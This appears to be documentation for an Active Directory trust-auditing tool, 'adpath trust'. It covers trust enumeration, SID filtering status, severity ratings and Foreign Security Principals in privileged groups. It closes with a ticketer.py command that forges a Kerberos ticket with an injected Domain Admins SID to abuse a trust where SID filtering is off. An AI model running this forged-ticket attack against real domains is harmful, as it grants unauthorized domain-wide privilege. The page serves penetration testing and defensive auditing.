# adpath trust

Enumerates domain and forest trusts, checks SID filtering configuration, and finds Foreign Security Principals in privileged groups.

## Usage

```bash
adpath trust -d <domain> -u <user> -p <pass> --dc <dc>
```

## What it checks

**Trust enumeration** — reads all `trustedDomain` objects:

| Field | Description |
|-------|-------------|
| Direction | Inbound / Outbound / Bidirectional |
| Type | AD (Uplevel), NT4 (Downlevel), MIT Kerberos |
| SID Filtering | ON / OFF / Internal |

**SID filtering status:**

- `Internal` — parent-child or tree-root trust within the same forest. SID filtering is disabled by design, not a vulnerability.
- `ON ✓` — SID filtering enforced. Safe.
- `OFF ⚠` — SID filtering disabled on an external or cross-forest trust. **SID history abuse possible.**

**Risk assessment:**

| Condition | Severity |
|-----------|----------|
| Bidirectional external + SID filtering OFF | Critical |
| SID filtering OFF on external trust | High |
| Bidirectional forest trust | Medium |
| RC4-only trust encryption | Low |

**Foreign Security Principals (FSPs)** — accounts from trusted external domains that are members of privileged local groups (Domain Admins, Administrators, etc.). Compromising the external domain grants privilege in this domain.

## Output includes

- Trust table with severity badges
- FSP findings (external SID → local privileged group)
- Next steps: ticketer.py SID history abuse commands per risky trust

## Example

```bash
adpath trust -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

```bash
# SID history abuse (SID filtering OFF on external trust)
ticketer.py -nthash <trust_key> -domain trusted.local -domain-sid <SID> \
  -extra-sid <DA_SID_of_corp.local> -spn krbtgt/corp.local administrator
```
